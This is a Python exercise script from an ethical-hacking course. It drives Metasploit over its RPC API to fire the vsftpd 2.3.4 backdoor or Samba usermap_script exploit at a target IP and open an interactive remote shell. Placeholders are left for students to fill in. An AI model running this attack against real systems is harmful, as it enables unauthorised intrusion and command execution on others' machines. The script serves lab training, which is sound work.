#******************************************************************************************************************
#Curso "Python para hacking ético" Tknika 2022/2023
#RESUMEN DEL SCRIPT:
#Atención: antes de ejecutar el script, tendrás que poner en marcha el servicor RPC desde la consola:#    $msfconsole
#    $load msgrpc Pass=python
#    Fíjate bien en el puerto que queda abierto (normalmente, 55552):
#           [*] MSGRPC Service:  127.0.0.1:55552 
#           [*] MSGRPC Username: msf
#           [*] MSGRPC Password: python
#           [*] Successfully loaded plugin: msgrpc
#Este script explota una vulnerabilidad de una máquina para obtener acceso a ella. 
#******************************************************************************************************************
from pymetasploit3.msfrpc import *
import ipaddress, time
#Función para validar si la IP introducida por el usuario es correcta
def validar_destino(direccion_destino):
    try:
        ipaddress.ip_address(direccion_destino)
        return True 
    except ValueError:
        return False

#Función que comprueba si un valor es un puerto válido: está vacío (puerto por defecto) o está entre 1 y 65535
def validar_puerto(puerto):
    if puerto=="":
        return True
    else:
        try:
            puerto_destino = int(puerto)
            if 1 <= puerto_destino <= 65535:
                return True
            else:
                return False
        except ValueError:
            return False

#Función para solicitar al usuario que introduzca los datos que vamos a necesitar para conectarnos al servidor ssh: IP, puerto de destino, y usuario. 
def solicitar_datos_usuario():
    try:
        destino_correcto=False
        puerto_correcto=False
        password_correcta=False
        while not destino_correcto:
            destino = input('>> Introduce la dirección del host objetivo (IP o nombre de host): ')
            if validar_destino(destino):
                destino_correcto=True
        while not puerto_correcto:
            puerto = input('>> Introduce el puerto objetivo, entre 1 y 65535 por defecto, 55552): ')
            if validar_puerto(puerto):
                puerto_correcto=True
                if puerto=="":
                    puerto = 55552
        while not password_correcta:
            password = input('>> Introduce la contraseña para conectarte con el servidor RPC : ')
            if password != "":
                password_correcta=True
    except ValueError:
        print ("Ha ocurrido un error inesperado...")
    return destino,puerto,password

if __name__ == '__main__':
    try:
        #(◕‿−)Solicitamos al usuario que introduzca los datos que necesitamos, guardándolos en las variables pertinentes#Solicitamos al usuario que introduzca los datos que necesitamos, guardándolos en las variables pertinentes

        #Creamos el objeto "cliente_rpc" de la clase MsfRpcClient para establecer una conexión con el servidor de Metasploit Framework (MSF) a través de su API RPC (Remote Procedure Call)
        #(◕‿−)Cambiar xxxx por la contraseña y zzzz por el puerto
        cliente_rpc = MsfRpcClient(xxxx, port=int(zzzz))
        #Indicamos el módulo  que vamos a utilizar. Será de tipo exploit, y su nombre es ''. La variable "exploit" será de tipo Exploit, clase de MSF que representa
        #un módulo de exploit. Es decir, toda la información del módulo se cargará en la variable "exploit". Los exploits que usaremos serán 'unix/ftp/vsftpd_234_backdoor' o 'multi/samba/usermap_script'
        #(◕‿−) Cambia ???? por el exploit que corresponda
        exploit = cliente_rpc.modules.use('exploit', '????')
        #Asignamos al parámetro RHOSTS (Remote hosts) la IP de la víctima
        exploit['RHOSTS']=str(ip)
        #Lanzamos el exploit utilizando uno de los payloads que ofrece; para 'unix/ftp/vsftpd_234_backdoor': 'cmd/unix/interact'
        #(◕‿−)Cambia ??????? por el payload 
        exploit.execute(payload='???????')
        #Damos un margen de 5 segundos para que la sesión se active correctamente.
        time.sleep(5)
        # Obtenemos la lista de sesiones activas.
        sesiones_activas = cliente_rpc.sessions.list
        # Verificamos si hay sesiones activas
        if sesiones_activas:
            # Obtenemos la primera sesión activa de la lista
            primera_sesion = list(sesiones_activas.keys())[0]
            # Realizamos operaciones en la sesión seleccionada
            sesion = cliente_rpc.sessions.session(primera_sesion)
            ejecuta_exit=False
            #Mientras el comando introducido no sea "exit", dejamos la sesión abierta y permitimos el envío de comandos.
            while not ejecuta_exit:
                comando = input ("$ ")
                if comando.lower()=="exit":
                    ejecuta_exit=True
                else:
                    #Escribimos en la sesión el comando ingresado, y luego leemos la respuesta y la imprimimos. 
                    sesion.write(comando + '\n')
                    #(◕‿−)Leemos e imprimimos la respuesta

                   
            sesion.stop()
        else:
            print("No hay sesiones activas.")
       
    except Exception as error:
        print (f"Ha ocurrido un error: {error}")
